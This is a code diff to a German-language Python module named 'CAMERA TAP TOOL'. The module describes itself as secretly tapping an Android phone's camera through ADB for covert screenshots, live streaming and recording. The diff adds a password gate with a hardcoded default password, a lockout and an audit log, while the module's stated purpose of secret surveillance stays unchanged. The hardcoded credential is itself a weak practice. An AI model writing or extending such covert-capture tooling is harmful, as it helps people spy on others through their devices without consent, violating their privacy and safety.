@@ -1,16 +1,19 @@
 """CAMERA TAP TOOL: Android-Kamera abhören & Screenshot + Video.
 
 Heimliche Video-Erfassung mit realtime Stream & Recording.
+GESCHÜTZT: Password-Authentifizierung erforderlich!
 """
 from __future__ import annotations
 
 import os
 import time
 import json
+import hashlib
 from typing import Optional, List, Dict, Tuple
 from dataclasses import dataclass
 from datetime import datetime
 from enum import Enum
+from getpass import getpass
 
 from . import ui
 from .adb import ADB
@@ -30,6 +33,128 @@ class CameraMode(Enum):
     FRONT = "front"      # Front-Kamera
     BACK = "back"        # Rückkamera
     THERMAL = "thermal"  # Thermalkamera (wenn verfügbar)
+
+
+class AuditLog:
+    """AUDIT-LOGGING für Camera-TAP Operationen."""
+
+    def __init__(self, log_file: str = "/tmp/camera_tap_audit.log"):
+        self.log_file = log_file
+        self.entries = []
+
+    def log_event(self, event_type: str, details: str, success: bool = True) -> None:
+        """Protokolliere ein Event."""
+        timestamp = datetime.now().isoformat()
+        status = "SUCCESS" if success else "FAILED"
+        entry = {
+            "timestamp": timestamp,
+            "type": event_type,
+            "details": details,
+            "status": status,
+        }
+        self.entries.append(entry)
+
+        try:
+            with open(self.log_file, "a") as f:
+                f.write(json.dumps(entry) + "\n")
+        except:
+            pass
+
+    def get_entries(self) -> List[Dict]:
+        """Hole alle Audit-Einträge."""
+        return self.entries
+
+
+class PasswordProtection:
+    """PASSWORD-SCHUTZ für Camera-TAP Tool."""
+
+    DEFAULT_PASSWORD_HASH = hashlib.sha256("ADMIN_CAMERA_TAP_2026".encode()).hexdigest()
+    MAX_ATTEMPTS = 3
+    LOCKOUT_TIME_SECONDS = 300  # 5 Minuten
+
+    def __init__(self, audit_log: Optional[AuditLog] = None):
+        self.failed_attempts = 0
+        self.lockout_until = 0.0
+        self.authenticated = False
+        self.audit_log = audit_log or AuditLog()
+
+    def is_locked_out(self) -> bool:
+        """Prüfe ob gesperrt."""
+        if self.lockout_until > time.time():
+            return True
+        self.lockout_until = 0.0
+        self.failed_attempts = 0
+        return False
+
+    def get_lockout_remaining(self) -> int:
+        """Verbleibende Lockout-Zeit in Sekunden."""
+        if self.is_locked_out():
+            return int(self.lockout_until - time.time())
+        return 0
+
+    def authenticate(self) -> bool:
+        """Authentifiziere mit Password."""
+        if self.is_locked_out():
+            lockout = self.get_lockout_remaining()
+            ui.err(f"❌ GESPERRT! Warte {lockout} Sekunden...")
+            self.audit_log.log_event("AUTH_ATTEMPT", f"SYSTEM LOCKED - {lockout}s remaining", False)
+            return False
+
+        ui.clear()
+        ui.rule("🔐 CAMERA-TAP PASSWORD-SCHUTZ", ui.BRED)
+        print()
+        print("  ⚠️  Dieses Tool ist GESCHÜTZT!")
+        print("  Geben Sie das Passwort ein.")
+        print()
+
+        try:
+            password = getpass("  Passwort: ")
+            password_hash = hashlib.sha256(password.encode()).hexdigest()
+
+            if password_hash == self.DEFAULT_PASSWORD_HASH:
+                self.authenticated = True
+                self.failed_attempts = 0
+                ui.ok("✅ Authentifizierung erfolgreich!")
+                self.audit_log.log_event("AUTH_SUCCESS", "Password authentication successful", True)
+                time.sleep(1)
+                return True
+            else:
+                self.failed_attempts += 1
+                remaining = self.MAX_ATTEMPTS - self.failed_attempts
+
+                if self.failed_attempts >= self.MAX_ATTEMPTS:
+                    self.lockout_until = time.time() + self.LOCKOUT_TIME_SECONDS
+                    ui.err(f"❌ Zu viele falsche Versuche! System für 5 Min gesperrt.")
+                    self.audit_log.log_event("AUTH_LOCKOUT", "Max failed attempts reached - 5 min lockout", False)
+                    time.sleep(2)
+                    return False
+                else:
+                    ui.err(f"❌ Falsches Passwort! {remaining} Versuche verbleibend.")
+                    self.audit_log.log_event("AUTH_FAILED", f"Wrong password - {remaining} attempts remaining", False)
+                    time.sleep(1)
+                    return False
+
+        except KeyboardInterrupt:
+            ui.warn("Abgebrochen.")
+            self.audit_log.log_event("AUTH_CANCELLED", "User cancelled authentication", False)
+            return False
+        except Exception as e:
+            ui.err(f"Authentifizierungsfehler: {e}")
+            self.audit_log.log_event("AUTH_ERROR", str(e), False)
+            return False
+
+    def require_auth(self) -> bool:
+        """Erzwinge Authentifizierung."""
+        if self.authenticated:
+            return True
+
+        max_retries = 3
+        for attempt in range(max_retries):
+            if self.authenticate():
+                return True
+
+        ui.err("❌ Authentifizierung fehlgeschlagen.")
+        return False
 
 
 @dataclass
@@ -91,9 +216,17 @@ class CameraTap:
         self.session_history: List[VideoSession] = []
         self.is_recording = False
         self.is_streaming = False
+        self.audit_log = AuditLog()
+        self.password_protection = PasswordProtection(self.audit_log)
 
     def show_camera_menu(self) -> None:
         """Zeigt Kamera-TAP Menü."""
+        # 🔐 PASSWORD-SCHUTZ ERZWINGEN
+        if not self.password_protection.require_auth():
+            ui.err("❌ Authentifizierung erforderlich!")
+            time.sleep(2)
+            return
+
         # PRÜFE GERÄT ZUERST
         if not self.adb or not hasattr(self.adb, 'shell'):
             ui.clear()
@@ -185,9 +318,11 @@ class CameraTap:
 
             ui.ok(f"Screenshot gespeichert: {filename}")
             ui.kv("Pfad", output_path)
+            self.audit_log.log_event("SCREENSHOT", f"Screenshot taken: {filename}", True)
 
         except Exception as e:
             ui.err(f"Screenshot-Fehler: {e}")
+            self.audit_log.log_event("SCREENSHOT", f"Failed: {str(e)[:100]}", False)
 
         print()
         ui.pause()
@@ -202,6 +337,7 @@ class CameraTap:
         print()
 
         if not ui.confirm("Wirklich starten?", False):
+            self.audit_log.log_event("LIVE_STREAM", "User cancelled", False)
             return
 
         print("\n  Verbinde mit Kamera-Stream...")
@@ -214,6 +350,8 @@ class CameraTap:
                 status="streaming",
                 stream_active=True,
             )
+
+            self.audit_log.log_event("LIVE_STREAM_START", f"Stream started: {session.session_id}", True)
 
             ui.rule("🔴 LIVE-VIDEO-STREAM AKTIV", ui.BRED)
             print()
@@ -237,6 +375,8 @@ class CameraTap:
             session.frames_captured = frames
             session.duration_ms = int((time.time() - session.start_time) * 1000)
             self.session_history.append(session)
+
+            self.audit_log.log_event("LIVE_STREAM_STOP", f"Stream stopped: {frames} frames, {session.duration_ms}ms", True)
 
             ui.ok("Stream beendet")
             ui.pause()
